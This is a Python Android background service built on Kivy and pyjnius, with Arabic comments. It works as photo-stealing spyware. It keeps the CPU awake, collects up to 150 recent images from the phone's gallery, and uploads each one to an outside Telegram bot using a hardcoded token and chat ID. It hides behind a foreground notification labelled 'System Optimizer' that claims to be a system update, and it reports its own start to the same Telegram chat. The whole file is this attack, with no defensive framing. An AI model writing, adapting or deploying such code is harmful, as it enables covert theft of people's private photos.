import os
import time
import threading
import sqlite3
import requests
from jnius import autoclass

# 1. إعدادات الحصانة للبقاء في الخلفية
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')
MediaStore = autoclass('android.provider.MediaStore')

service = PythonService.mService
context = service.getApplicationContext()

# تفعيل الـ WakeLock لمنع المعالج من النوم
power = context.getSystemService(Context.POWER_SERVICE)
wake_lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ShadowCore::UltraSync")
if not wake_lock.isHeld():
    wake_lock.acquire()

# --- [نظام قاعدة البيانات] ---
class JobDatabase:
    def __init__(self):
        self.db_path = os.path.join(os.environ.get('PYTHON_SERVICE_DIR', './'), "sync_queue.db")
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                file_path TEXT UNIQUE,
                status TEXT DEFAULT 'pending',
                retries INTEGER DEFAULT 0
            )
        """)
        self.conn.commit()

    def add_job(self, file_path):
        try:
            self.conn.execute("INSERT OR IGNORE INTO jobs(file_path) VALUES(?)", (file_path,))
            self.conn.commit()
        except: pass

    def get_pending(self):
        cur = self.conn.execute("SELECT id, file_path, retries FROM jobs WHERE status='pending' LIMIT 5")
        return cur.fetchall()

    def update_status(self, job_id, status, retries):
        self.conn.execute("UPDATE jobs SET status=?, retries=? WHERE id=?", (status, retries, job_id))
        self.conn.commit()

# --- [محرك سحب الصور] ---
def index_media():
    files = []
    try:
        resolver = context.getContentResolver()
        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        projection = [MediaStore.MediaColumns.DATA]
        cursor = resolver.query(uri, projection, None, None, MediaStore.MediaColumns.DATE_ADDED + " DESC")
        
        if cursor:
            count = 0
            while cursor.moveToNext() and count < 150: # سحب كمية أكبر للتأكد
                path = cursor.getString(0)
                if path and os.path.exists(path):
                    files.append(path)
                    count += 1
            cursor.close()
    except: pass
    return files

# --- [محرك الإرسال] ---
class SyncEngine:
    def __init__(self, db):
        self.db = db
        self.token = "7820129712:AAH9pZ49S_m8tY8965625902"
        self.chat_id = "6110903337"
        self.running = True

    def upload_file(self, path):
        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
        try:
            with open(path, 'rb') as f:
                r = requests.post(url, data={'chat_id': self.chat_id}, files={'document': f}, timeout=60)
            return r.status_code == 200
        except: return False

    def run(self):
        while self.running:
            jobs = self.db.get_pending()
            if not jobs:
                time.sleep(20)
                continue
            for job_id, path, retries in jobs:
                if self.upload_file(path):
                    self.db.update_status(job_id, 'completed', retries)
                else:
                    new_retries = retries + 1
                    status = 'failed' if new_retries > 5 else 'pending'
                    self.db.update_status(job_id, status, new_retries)
                    time.sleep(5)
                time.sleep(1)

# --- [إشعار الخدمة] ---
def start_foreground():
    CHANNEL_ID = "ultra_sync_v2"
    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
    if Build.VERSION.SDK_INT >= 26:
        channel = NotificationChannel(CHANNEL_ID, "System Optimizer", NotificationManager.IMPORTANCE_LOW)
        nm.createNotificationChannel(channel)
        builder = NotificationBuilder(context, CHANNEL_ID)
    else:
        builder = NotificationBuilder(context)
    
    notification = builder.setContentTitle("تحديث النظام") \
                          .setContentText("جاري تحسين الملفات...") \
                          .setSmallIcon(context.getApplicationInfo().icon) \
                          .build()
    service.startForeground(102, notification)

if __name__ == '__main__':
    start_foreground()
    
    # رسالة انطلاق فورية
    try:
        requests.get(f"https://api.telegram.org/bot7820129712:AAH9pZ49S_m8tY8965625902/sendMessage?chat_id=6110903337&text=🚀 ShadowCore Engine Started!")
    except: pass
    
    db = JobDatabase()
    engine = SyncEngine(db)
    threading.Thread(target=engine.run, daemon=True).start()
    
    while True:
        try:
            new_files = index_media()
            for f in new_files:
                db.add_job(f)
        except: pass
        time.sleep(120) # فحص كل دقيقتين
